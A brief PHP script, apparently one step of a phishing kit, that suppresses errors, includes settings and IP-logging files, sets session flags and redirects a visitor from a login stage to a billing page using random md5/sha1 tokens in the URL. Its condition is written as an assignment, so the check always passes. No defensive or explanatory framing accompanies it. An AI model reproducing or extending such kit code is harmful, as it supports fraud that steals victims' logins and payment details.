<?php
  error_reporting(0);
  ob_start();
  session_start();
  include '../../Settings.php';
  include '../../ip.php';
if($_SESSION['step_one']  = true){
$_SESSION['step_two']  = true;
header('location: ../billing.php?enc='.md5(time()).'&p=0&dispatch='.sha1(time()));

}
else
{
  header('location: ../../login.php');
}

?>